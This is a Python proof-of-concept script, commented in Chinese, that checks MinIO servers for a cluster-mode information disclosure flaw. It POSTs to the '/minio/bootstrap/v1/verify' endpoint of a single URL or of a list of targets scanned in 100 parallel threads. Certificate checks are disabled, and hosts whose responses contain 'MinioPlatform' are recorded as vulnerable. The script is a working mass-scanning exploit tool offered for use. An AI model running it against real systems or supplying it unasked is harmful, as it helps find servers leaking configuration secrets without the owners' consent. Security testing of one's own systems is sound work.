# MinIO集群模式信息泄露漏洞
import requests,json,sys,argparse
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
███╗   ███╗██╗███╗   ██╗██╗ ██████╗ 
████╗ ████║██║████╗  ██║██║██╔═══██╗
██╔████╔██║██║██╔██╗ ██║██║██║   ██║
██║╚██╔╝██║██║██║╚██╗██║██║██║   ██║
██║ ╚═╝ ██║██║██║ ╚████║██║╚██████╔╝
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ 
                                    
                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)

def main():
    banner()
    parser = argparse.ArgumentParser(description='MinIO集群模式信息泄露漏洞复现POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    api_payload = '/minio/bootstrap/v1/verify'
    headers = {
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Accept-Language':'en-US;q=0.9,en;q=0.8',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
        'Connection':'close',
        'Cache-Control':'max-age=0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'0',
    }
    try:
        response = requests.post(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if response.status_code == 200 and 'MinioPlatform' in response.text:
            print(f'[+]{target} 存在信息泄露漏洞')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]{target} 不存在信息泄露漏洞')
    except:
        print(f'[-]{target} 该站点无法访问')

if __name__ == '__main__':
    main()